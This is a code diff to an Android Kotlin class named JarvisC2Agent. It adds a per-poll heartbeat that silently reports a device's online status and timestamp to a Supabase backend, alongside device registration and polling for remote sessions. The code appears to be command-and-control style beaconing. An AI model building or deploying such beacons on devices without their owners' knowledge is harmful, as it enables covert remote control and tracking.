@@ -69,6 +69,7 @@ class JarvisC2Agent(private val context: Context) {
             registerOrUpdateDevice()
             while (isActive) {
                 try {
+                    heartbeat()
                     pollForSession()
                 } catch (e: Exception) {
                     Log.e(TAG, "Poll error: ${e.message}")
@@ -88,6 +89,9 @@ class JarvisC2Agent(private val context: Context) {
     // ──────────────────────────────────────────────────────────────────────────
 
     private suspend fun registerOrUpdateDevice() {
+        val now = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).apply {
+            timeZone = java.util.TimeZone.getTimeZone("UTC")
+        }.format(java.util.Date())
         val body = JSONObject().apply {
             put("device_id",      deviceId)
             put("device_name",    deviceName)
@@ -96,6 +100,7 @@ class JarvisC2Agent(private val context: Context) {
             put("android_version","Android ${Build.VERSION.RELEASE}")
             put("api_level",      Build.VERSION.SDK_INT)
             put("status",         "Online")
+            put("last_seen",      now)
         }.toString()
 
         val request = Request.Builder()
@@ -111,6 +116,28 @@ class JarvisC2Agent(private val context: Context) {
         }.onFailure {
             Log.e(TAG, "Device registration failed: ${it.message}")
         }
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    //  Heartbeat (per-poll-cycle keep-alive)
+    // ──────────────────────────────────────────────────────────────────────────
+
+    private suspend fun heartbeat() {
+        val now = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).apply {
+            timeZone = java.util.TimeZone.getTimeZone("UTC")
+        }.format(java.util.Date())
+        val body = JSONObject().apply {
+            put("last_seen", now)
+            put("status", "Online")
+        }.toString()
+        val request = Request.Builder()
+            .url("$SUPABASE_URL/jarvis_devices?device_id=eq.$deviceId")
+            .headers(supabaseHeaders())
+            .patch(body.toRequestBody("application/json".toMediaType()))
+            .build()
+        runCatching { http.newCall(request).execute() }.onSuccess { resp ->
+            resp.close()
+        }.onFailure { /* silent */ }
     }
 
     // ──────────────────────────────────────────────────────────────────────────
